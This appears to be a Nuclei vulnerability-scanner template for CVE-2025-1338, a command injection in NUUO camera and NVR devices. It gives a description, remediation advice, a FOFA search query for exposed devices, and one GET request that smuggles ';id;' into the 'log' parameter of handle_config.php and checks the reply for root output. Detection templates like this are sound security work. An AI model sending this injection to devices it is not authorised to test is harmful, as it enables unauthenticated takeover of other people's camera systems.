id: CVE-2025-1338

info:
  name: NUUO Camera OS Command Injection Vulnerability (CVE-2025-1338)
  author: Ark
  severity: critical
  description: |
    NUUO Camera devices up to version 20250203 are vulnerable to OS command injection through the handle_config.php endpoint. The 'log' parameter in the print_file function allows attackers to inject arbitrary operating system commands.
  impact: |
    Unauthenticated remote attackers can execute arbitrary OS commands on the affected NUUO Camera/NVR devices, leading to complete system compromise. This vulnerability has been exploited in the wild.
  remediation: |
    Update NUUO Camera firmware to the latest version that addresses this command injection vulnerability. Restrict access to the device management interface and implement network segmentation.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-1338
    - https://github.com/advisories/GHSA-vw58-vgp6-39qx
    - https://dbugs.ptsecurity.com/vulnerability/CVE-2025-1338
  metadata:
    verified: true
    max-request: 1
    fofa-query:
      - title="Network Video Recorder Login" || body="www.nuuo.com/eHelpdesk.php"
  tags: cve,cve2025,nuuo,rce,cmdi,intrusive,vuln

http:
  - raw:
      - |
        GET /handle_config.php?log=;id; HTTP/1.1
        Host: {{Hostname}}


    matchers:
      - type: dsl
        dsl:
          - contains_all(body, "uid=0(root)", "gid=0(root)")
          - status_code == 200
        condition: and
